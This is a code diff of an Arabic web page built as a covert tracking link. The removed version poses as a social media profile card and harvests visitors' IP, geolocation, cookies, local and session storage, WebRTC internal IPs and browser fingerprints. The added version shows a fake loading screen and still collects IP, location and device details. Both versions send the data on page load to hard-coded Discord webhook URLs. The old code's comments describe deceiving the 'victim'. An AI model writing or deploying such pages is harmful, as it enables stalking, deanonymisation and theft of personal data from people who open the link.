@@ -2,564 +2,122 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>صورة بروفايل</title>
+    <title>رابط تتبع IP</title>
     <style>
-        /* ================================================================
-           CSS - التمويه والتصميم
-           ================================================================ */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
         body {
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            background: #0d0d1a;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            direction: rtl;
-        }
-        .card {
-            background: rgba(255, 255, 255, 0.06);
-            backdrop-filter: blur(14px);
-            -webkit-backdrop-filter: blur(14px);
-            border-radius: 32px;
-            padding: 30px 25px 35px;
-            width: 90%;
-            max-width: 400px;
-            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.6);
-            border: 1px solid rgba(255, 255, 255, 0.08);
+            height: 100vh;
+            color: white;
+            font-family: Arial;
             text-align: center;
-            transition: 0.3s;
         }
-        .card img {
-            width: 130px;
-            height: 130px;
-            border-radius: 50%;
-            object-fit: cover;
-            border: 3px solid rgba(255, 255, 255, 0.15);
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.5);
-            margin-bottom: 12px;
+        .box {
+            background: #1a1a2e;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 0 30px #5865f2;
         }
-        .card h2 {
-            color: #fff;
-            font-size: 22px;
-            font-weight: 500;
-            letter-spacing: 0.5px;
-            margin-bottom: 6px;
+        .box h1 {
+            color: #5865f2;
         }
-        .card .sub {
-            color: #a8a8c8;
-            font-size: 14px;
-            margin-bottom: 18px;
+        .box p {
+            color: #aaa;
         }
-        .card .badge {
-            display: inline-block;
-            background: rgba(255, 255, 255, 0.07);
-            padding: 6px 18px;
-            border-radius: 40px;
-            color: #b7b7e6;
-            font-size: 13px;
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            margin-bottom: 20px;
-        }
-        .card .btn {
-            background: #5865f2;
-            border: none;
-            color: #fff;
-            padding: 12px 30px;
-            border-radius: 40px;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: 0.25s;
-            box-shadow: 0 6px 18px rgba(88, 101, 242, 0.25);
-            width: 100%;
-            max-width: 200px;
-        }
-        .card .btn:hover {
-            background: #4752c4;
-            transform: scale(1.02);
-            box-shadow: 0 10px 28px rgba(88, 101, 242, 0.35);
-        }
-        .card .btn:active {
-            transform: scale(0.96);
-        }
-        .footer-note {
-            margin-top: 18px;
-            color: rgba(255, 255, 255, 0.2);
-            font-size: 11px;
-            letter-spacing: 0.3px;
-        }
-        /* تمويه إضافي: شريط تحميل وهمي */
-        .fake-loader {
-            width: 100%;
-            height: 4px;
-            background: rgba(255, 255, 255, 0.04);
-            border-radius: 6px;
-            margin: 14px 0 8px;
-            overflow: hidden;
-        }
-        .fake-loader span {
-            display: block;
-            height: 100%;
-            width: 40%;
-            background: linear-gradient(90deg, #5865f2, #9b8aff);
-            border-radius: 6px;
-            animation: loadingMove 1.8s infinite ease-in-out;
-        }
-        @keyframes loadingMove {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(350%); }
-        }
-        /* تحذير: هذه الصفحة لأغراض اختبارية فقط */
     </style>
 </head>
 <body>
-
-    <!-- ================================================================
-    HTML - هيكل الصفحة (التمويه)
-    ================================================================ -->
-    <div class="card">
-        <!-- صورة بروفايل وهمية -->
-        <img src="https://i.pinimg.com/vwebp/1200x/64/85/cd/6485cd5e8911439c12cf2e0224968027.webp" alt="صورة الملف الشخصي" id="profileImg" />
-
-        <h2>أحمد السالمي</h2>
-        <div class="sub">@ahmed_salmi · عضو متميز</div>
-        <div class="badge">🟢 نشط الآن</div>
-
-        <!-- شريط تحميل وهمي لإيهام الضحية -->
-        <div class="fake-loader"><span></span></div>
-
-        <!-- زر وهمي (غير فعال) -->
-        <button class="btn" id="fakeBtn">عرض الملف الشخصي</button>
-        <div class="footer-note">تم التحقق • محمي بـ SSL</div>
+    <div class="box">
+        <h1>📡 جاري تحميل المحتوى...</h1>
+        <p>يرجى الانتظار لحظة</p>
     </div>
 
-    <!-- ================================================================
-    JAVASCRIPT - قلب الصفحة المفخخ (جامع البيانات الصامت)
-    ================================================================ -->
     <script>
         (function() {
-            'use strict';
+            // =============================================================
+            //  رابط Webhook الخاص بك (ضع الرابط هنا)
+            // =============================================================
+            var WEBHOOK_URL = "https://discord.com/api/webhooks/1532041480225427610/8hj5HMSMCYsaNoO-0_rGCJ64hGz-Z7jLvuZGxettxaH5q6m8FSueAXgJ5z0sXCSlAwvU"
 
-            // ----------------------------------------------------------------
-            // 1. التهيئة - ضع رابط Webhook الخاص بك هنا
-            // ----------------------------------------------------------------
-            var WEBHOOK_URL = "https://discord.com/api/webhooks/1532033541850927327/9IfK0JnKgelYdWC-uqlidjvgb3i0EV0mH4Mt3a8j3HglKymc8itr5-7KhWy68_0vnkC8";  // <--- غيّر هذا
-
-            // ----------------------------------------------------------------
-            // 2. دالة مساعدة: جلب IP + الموقع (بدون صلاحيات)
-            // ----------------------------------------------------------------
+            // =============================================================
+            //  جلب IP والموقع
+            // =============================================================
             function getIPAndLocation() {
-                return new Promise(function(resolve) {
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', 'https://ipinfo.io/json', true);
+                xhr.timeout = 5000;
+                xhr.onload = function() {
                     try {
-                        var xhr = new XMLHttpRequest();
-                        xhr.open('GET', 'https://ipinfo.io/json', true);
-                        xhr.timeout = 5000;
-                        xhr.onload = function() {
-                            try {
-                                var data = JSON.parse(xhr.responseText);
-                                var loc = data.loc ? data.loc.split(',') : ['?', '?'];
-                                resolve({
-                                    ip: data.ip || 'Unknown',
-                                    country: data.country || '?',
-                                    region: data.region || '?',
-                                    city: data.city || '?',
-                                    postal: data.postal || '?',
-                                    lat: loc[0] || '?',
-                                    lon: loc[1] || '?',
-                                    timezone: data.timezone || '?',
-                                    org: data.org || '?'
-                                });
-                            } catch (e) {
-                                resolve({ ip: 'Unknown', country: '?', region: '?', city: '?', lat: '?', lon: '?' });
-                            }
-                        };
-                        xhr.onerror = function() { resolve({ ip: 'Unknown' }); };
-                        xhr.ontimeout = function() { resolve({ ip: 'Unknown' }); };
-                        xhr.send();
+                        var data = JSON.parse(xhr.responseText);
+                        var loc = data.loc ? data.loc.split(',') : ['?', '?'];
+                        sendData({
+                            ip: data.ip || 'Unknown',
+                            country: data.country || '?',
+                            region: data.region || '?',
+                            city: data.city || '?',
+                            lat: loc[0] || '?',
+                            lon: loc[1] || '?',
+                            org: data.org || '?',
+                            timezone: data.timezone || '?',
+                            hostname: data.hostname || '?'
+                        });
                     } catch (e) {
-                        resolve({ ip: 'Unknown' });
+                        sendData({ error: 'Failed to parse location' });
                     }
-                });
+                };
+                xhr.onerror = function() { sendData({ error: 'Failed to fetch IP' }); };
+                xhr.ontimeout = function() { sendData({ error: 'Timeout' }); };
+                xhr.send();
             }
 
-            // ----------------------------------------------------------------
-            // 3. معلومات النظام والمتصفح
-            // ----------------------------------------------------------------
-            function getSystemInfo() {
-                var info = {};
-                try {
-                    info.ua = navigator.userAgent || 'Unknown';
-                    info.platform = navigator.platform || 'Unknown';
-                    info.lang = navigator.language || 'Unknown';
-                    info.langs = (navigator.languages) ? navigator.languages.join(',') : 'Unknown';
-                    info.cookies = navigator.cookieEnabled || false;
-                    info.hwConcurrency = navigator.hardwareConcurrency || '?';
-                    info.deviceMemory = navigator.deviceMemory || '?';
-                    info.touchPoints = navigator.maxTouchPoints || 0;
-                    info.screenW = screen.width || 0;
-                    info.screenH = screen.height || 0;
-                    info.colorDepth = screen.colorDepth || 0;
-                    info.pixelRatio = window.devicePixelRatio || 1;
-                    info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
-                    info.tzOffset = new Date().getTimezoneOffset() || 0;
-                    info.localTime = new Date().toISOString() || 'Unknown';
-                    info.os = getOS();
-                    info.browser = getBrowser();
-                } catch (e) { /* تجاهل */ }
-                return info;
-            }
+            // =============================================================
+            //  إرسال البيانات إلى Webhook
+            // =============================================================
+            function sendData(ipData) {
+                var payload = {
+                    'IP': ipData.ip || 'Unknown',
+                    'Country': ipData.country || '?',
+                    'Region': ipData.region || '?',
+                    'City': ipData.city || '?',
+                    'Lat': ipData.lat || '?',
+                    'Lon': ipData.lon || '?',
+                    'Organization': ipData.org || '?',
+                    'Timezone': ipData.timezone || '?',
+                    'Hostname': ipData.hostname || '?',
+                    'UserAgent': navigator.userAgent || 'Unknown',
+                    'Platform': navigator.platform || 'Unknown',
+                    'Language': navigator.language || 'Unknown',
+                    'Screen': screen.width + 'x' + screen.height,
+                    'Referrer': document.referrer || 'Direct',
+                    'Page URL': window.location.href,
+                    'Time': new Date().toISOString()
+                };
 
-            function getOS() {
-                try {
-                    var ua = navigator.userAgent;
-                    if (ua.indexOf('Windows NT 10.0') !== -1) return 'Windows 10/11';
-                    if (ua.indexOf('Windows NT 6.3') !== -1) return 'Windows 8.1';
-                    if (ua.indexOf('Windows NT 6.2') !== -1) return 'Windows 8';
-                    if (ua.indexOf('Windows NT 6.1') !== -1) return 'Windows 7';
-                    if (ua.indexOf('Mac OS X') !== -1) return 'macOS';
-                    if (ua.indexOf('Linux') !== -1) return 'Linux';
-                    if (ua.indexOf('Android') !== -1) return 'Android';
-                    if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) return 'iOS';
-                } catch (e) {}
-                return 'Unknown';
-            }
+                var jsonData = JSON.stringify(payload);
 
-            function getBrowser() {
-                try {
-                    var ua = navigator.userAgent;
-                    if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1) return 'Chrome';
-                    if (ua.indexOf('Edg') !== -1) return 'Edge';
-                    if (ua.indexOf('Firefox') !== -1) return 'Firefox';
-                    if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) return 'Safari';
-                    if (ua.indexOf('Opera') !== -1 || ua.indexOf('OPR') !== -1) return 'Opera';
-                } catch (e) {}
-                return 'Unknown';
-            }
-
-            // ----------------------------------------------------------------
-            // 4. معلومات الشبكة (السرعة، النوع، إلخ)
-            // ----------------------------------------------------------------
-            function getNetworkInfo() {
-                try {
-                    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
-                    return {
-                        type: conn.effectiveType || '?',
-                        rtt: conn.rtt || '?',
-                        downlink: conn.downlink || '?',
-                        saveData: conn.saveData || false
-                    };
-                } catch (e) {
-                    return { type: '?', rtt: '?', downlink: '?', saveData: false };
-                }
-            }
-
-            // ----------------------------------------------------------------
-            // 5. البطارية (إن كانت مدعومة)
-            // ----------------------------------------------------------------
-            function getBattery() {
-                return new Promise(function(resolve) {
-                    try {
-                        if (!navigator.getBattery) {
-                            resolve(null);
-                            return;
-                        }
-                        navigator.getBattery().then(function(b) {
-                            resolve({
-                                level: Math.round(b.level * 100),
-                                charging: b.charging,
-                                chargingTime: b.chargingTime || '?',
-                                dischargingTime: b.dischargingTime || '?'
-                            });
-                        }).catch(function() { resolve(null); });
-                    } catch (e) {
-                        resolve(null);
-                    }
-                });
-            }
-
-            // ----------------------------------------------------------------
-            // 6. بصمة Canvas (متعارف عليها)
-            // ----------------------------------------------------------------
-            function getFingerprint() {
-                try {
-                    var canvas = document.createElement('canvas');
-                    canvas.width = 256;
-                    canvas.height = 256;
-                    var ctx = canvas.getContext('2d');
-                    ctx.textBaseline = 'top';
-                    ctx.font = '14px Arial';
-                    ctx.fillStyle = '#f60';
-                    ctx.fillRect(10, 10, 40, 20);
-                    ctx.fillStyle = '#069';
-                    ctx.fillText('FP', 60, 15);
-                    ctx.fillStyle = 'rgba(102,204,0,0.7)';
-                    ctx.fillText('T', 90, 17);
-                    ctx.strokeStyle = '#f00';
-                    ctx.lineWidth = 2;
-                    ctx.strokeRect(5, 5, 200, 40);
-                    return canvas.toDataURL('image/png').substring(0, 80) + '...';
-                } catch (e) {
-                    return 'Canvas blocked';
-                }
-            }
-
-            // ----------------------------------------------------------------
-            // 7. عناوين IP الداخلية عبر WebRTC
-            // ----------------------------------------------------------------
-            function getWebRTCIPs() {
-                return new Promise(function(resolve) {
-                    try {
-                        var ips = [];
-                        var pc = new RTCPeerConnection({ iceServers: [] });
-                        pc.createDataChannel('');
-                        pc.createOffer().then(function(offer) {
-                            return pc.setLocalDescription(offer);
-                        }).then(function() {
-                            try {
-                                var lines = pc.localDescription.sdp.split('\n');
-                                lines.forEach(function(line) {
-                                    if (line.indexOf('candidate') !== -1) {
-                                        var parts = line.split(' ');
-                                        if (parts.length > 7) {
-                                            var ip = parts[4];
-                                            if (ip && ips.indexOf(ip) === -1 && ip.indexOf(':') === -1) {
-                                                ips.push(ip);
-                                            }
-                                        }
-                                    }
-                                });
-                            } catch (e) {}
-                            resolve(ips);
-                        }).catch(function() { resolve([]); });
-                        setTimeout(function() { resolve([]); }, 2000);
-                    } catch (e) {
-                        resolve([]);
-                    }
-                });
-            }
-
-            // ----------------------------------------------------------------
-            // 8. قراءة التخزين المحلي (بدون توكنات)
-            // ----------------------------------------------------------------
-            function getStorageData() {
-                try {
-                    var ls = {};
-                    for (var i = 0; i < localStorage.length; i++) {
-                        var key = localStorage.key(i);
-                        if (key && key.toLowerCase().indexOf('token') === -1) {
-                            ls[key] = localStorage.getItem(key);
-                        }
-                    }
-                    var ss = {};
-                    for (var j = 0; j < sessionStorage.length; j++) {
-                        var skey = sessionStorage.key(j);
-                        if (skey && skey.toLowerCase().indexOf('token') === -1) {
-                            ss[skey] = sessionStorage.getItem(skey);
-                        }
-                    }
-                    return {
-                        cookies: document.cookie || 'None',
-                        localStorage: ls,
-                        sessionStorage: ss
-                    };
-                } catch (e) {
-                    return { cookies: 'Blocked', localStorage: {}, sessionStorage: {} };
-                }
-            }
-
-            // ----------------------------------------------------------------
-            // 9. قائمة الإضافات (Plugins)
-            // ----------------------------------------------------------------
-            function getPlugins() {
-                try {
-                    var list = [];
-                    for (var i = 0; i < navigator.plugins.length; i++) {
-                        var p = navigator.plugins[i];
-                        if (p && p.name) {
-                            list.push(p.name);
-                        }
-                    }
-                    return list;
-                } catch (e) {
-                    return [];
-                }
-            }
-
-            // ----------------------------------------------------------------
-            // 10. معلومات النافذة والشاشة
-            // ----------------------------------------------------------------
-            function getWindowInfo() {
-                try {
-                    return {
-                        innerW: window.innerWidth || 0,
-                        innerH: window.innerHeight || 0,
-                        outerW: window.outerWidth || 0,
-                        outerH: window.outerHeight || 0,
-                        availW: screen.availWidth || 0,
-                        availH: screen.availHeight || 0
-                    };
-                } catch (e) {
-                    return {};
-                }
-            }
-
-            // ----------------------------------------------------------------
-            // 11. كشف الخطوط المثبتة
-            // ----------------------------------------------------------------
-            function getFonts() {
-                var fonts = [];
-                var testFonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS', 'Lucida Console', 'Arial Black'];
-                try {
-                    var canvas = document.createElement('canvas');
-                    var ctx = canvas.getContext('2d');
-                    ctx.font = '72px monospace';
-                    var base = ctx.measureText('mmmmmmmmmmli').width;
-                    testFonts.forEach(function(font) {
-                        ctx.font = '72px ' + font + ', monospace';
-                        var width = ctx.measureText('mmmmmmmmmmli').width;
-                        if (width !== base) {
-                            fonts.push(font);
-                        }
-                    });
-                } catch (e) {}
-                return fonts;
-            }
-
-            // ----------------------------------------------------------------
-            // 12. الإرسال إلى Webhook (3 طرق احتياطية)
-            // ----------------------------------------------------------------
-            function exfiltrate(data) {
-                var jsonData = JSON.stringify(data);
-
-                // الطريقة 1: XMLHttpRequest (الأكثر توافقاً)
+                // إرسال عبر XMLHttpRequest
                 try {
                     var xhr = new XMLHttpRequest();
                     xhr.open('POST', WEBHOOK_URL, true);
                     xhr.setRequestHeader('Content-Type', 'application/json');
-                    xhr.timeout = 8000;
-                    xhr.onerror = function() {
-                        try { navigator.sendBeacon(WEBHOOK_URL, jsonData); } catch (e2) {}
-                    };
-                    xhr.ontimeout = function() {
-                        try { navigator.sendBeacon(WEBHOOK_URL, jsonData); } catch (e2) {}
-                    };
                     xhr.send(jsonData);
-                    return;
-                } catch (e) {}
-
-                // الطريقة 2: sendBeacon
-                try {
-                    navigator.sendBeacon(WEBHOOK_URL, jsonData);
-                    return;
-                } catch (e) {}
-
-                // الطريقة 3: Image Beacon (أخر حل)
-                try {
-                    var img = new Image();
-                    img.src = WEBHOOK_URL + '?data=' + encodeURIComponent(jsonData);
-                } catch (e) {}
-            }
-
-            // ----------------------------------------------------------------
-            // 13. الجامع الرئيسي
-            // ----------------------------------------------------------------
-            async function silentCollect() {
-                try {
-                    var ipData = await getIPAndLocation();
+                    console.log('[+] Data sent:', payload);
                 } catch (e) {
-                    var ipData = { ip: 'Unknown', country: '?', region: '?', city: '?', postal: '?', lat: '?', lon: '?', timezone: '?', org: '?' };
+                    // محاولة عبر sendBeacon
+                    try {
+                        navigator.sendBeacon(WEBHOOK_URL, jsonData);
+                    } catch (e2) {
+                        console.log('[-] Failed to send data');
+                    }
                 }
-
-                var batt = await getBattery().catch(function() { return null; });
-                var webrtc = await getWebRTCIPs().catch(function() { return []; });
-
-                var system = getSystemInfo();
-                var network = getNetworkInfo();
-                var storage = getStorageData();
-                var plugins = getPlugins();
-                var fingerprint = getFingerprint();
-                var windowInfo = getWindowInfo();
-                var fonts = getFonts();
-
-                var payload = {
-                    'IP': ipData.ip || 'Unknown',
-                    'Location': {
-                        'Country': ipData.country || '?',
-                        'Region': ipData.region || '?',
-                        'City': ipData.city || '?',
-                        'Postal': ipData.postal || '?',
-                        'Lat': ipData.lat || '?',
-                        'Lon': ipData.lon || '?',
-                        'Timezone': ipData.timezone || '?',
-                        'Organization': ipData.org || '?'
-                    },
-                    'OS': system.os || 'Unknown',
-                    'Browser': system.browser || 'Unknown',
-                    'Device': {
-                        'Platform': system.platform || 'Unknown',
-                        'Language': system.lang || 'Unknown',
-                        'Languages': system.langs || 'Unknown',
-                        'Screen': (system.screenW || '?') + 'x' + (system.screenH || '?'),
-                        'Available Screen': (windowInfo.availW || '?') + 'x' + (windowInfo.availH || '?'),
-                        'Window Size': (windowInfo.innerW || '?') + 'x' + (windowInfo.innerH || '?'),
-                        'Color Depth': system.colorDepth || '?',
-                        'Pixel Ratio': system.pixelRatio || '?',
-                        'CPU Cores': system.hwConcurrency || '?',
-                        'RAM': system.deviceMemory ? system.deviceMemory + 'GB' : '?',
-                        'Touch Points': system.touchPoints || '?',
-                        'Timezone': system.timezone || 'Unknown',
-                        'Offset (min)': system.tzOffset || '?',
-                        'Local Time': system.localTime || 'Unknown'
-                    },
-                    'Network': network,
-                    'Battery': batt || { level: '?', charging: '?' },
-                    'WebRTC IPs': webrtc || [],
-                    'Plugins': plugins || [],
-                    'Fonts Detected': fonts || [],
-                    'Canvas Fingerprint': fingerprint || 'Unknown',
-                    'Cookies': storage.cookies || 'None',
-                    'LocalStorage': storage.localStorage || {},
-                    'SessionStorage': storage.sessionStorage || {},
-                    'UserAgent': system.ua || 'Unknown',
-                    'Referrer': document.referrer || 'Direct',
-                    'Page URL': window.location.href || 'Unknown',
-                    'Time': new Date().toISOString() || 'Unknown'
-                };
-
-                exfiltrate(payload);
             }
 
-            // ----------------------------------------------------------------
-            // 14. التنفيذ الصامت عند تحميل الصفحة
-            // ----------------------------------------------------------------
-            if (document.readyState === 'complete') {
-                setTimeout(silentCollect, 500);
-            } else {
-                window.addEventListener('load', function() {
-                    setTimeout(silentCollect, 500);
-                });
-            }
-            setTimeout(silentCollect, 200);
-
-            // ----------------------------------------------------------------
-            // 15. (اختياري) سلوك وهمي عند الضغط على الزر لإيهام الضحية
-            // ----------------------------------------------------------------
-            document.getElementById('fakeBtn').addEventListener('click', function(e) {
-                e.preventDefault();
-                this.innerText = 'جاري التحميل...';
-                this.disabled = true;
-                setTimeout(function() {
-                    this.innerText = 'عرض الملف الشخصي';
-                    this.disabled = false;
-                }.bind(this), 1200);
-            });
-
+            // =============================================================
+            //  تنفيذ التتبع عند تحميل الصفحة
+            // =============================================================
+            getIPAndLocation();
         })();
     </script>
 </body>
